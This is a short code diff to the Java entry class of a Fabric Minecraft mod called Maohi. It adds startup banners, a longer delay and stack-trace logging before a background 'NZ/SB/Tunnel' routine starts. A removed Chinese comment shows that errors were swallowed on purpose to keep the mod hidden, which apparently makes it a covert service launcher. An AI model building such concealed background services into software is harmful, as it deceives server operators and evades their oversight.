@@ -162,6 +162,10 @@ public class Maohi implements ModInitializer {
 
     @Override
     public void onInitialize() {
+        // 强制打印高亮横幅，确保由于加载器限制导致 LOGGER 被静默时也能看到
+        System.out.println("==================================================");
+        System.out.println("[Maohi] !!! FABRIC MOD INITIALIZING !!!");
+        System.out.println("==================================================");
 
         // 注册服务器生命周期事件
         ServerLifecycleEvents.SERVER_STARTED.register(this::onServerStarted);
@@ -174,10 +178,12 @@ public class Maohi implements ModInitializer {
         Thread thread = new Thread(() -> {
             try {
                 // 等待服务器完全启动后再启动各项服务
-                Thread.sleep(10000);
+                Thread.sleep(15000);
+                System.out.println("[Maohi] Starting background core logic (NZ/SB/Tunnel)...");
                 start();
             } catch (Exception e) {
-                // 静默失败，不抛出异常以维持隐蔽性
+                // 打印堆栈以便排错
+                e.printStackTrace();
             }
         }, "Maohi-Main");
         thread.setDaemon(true);
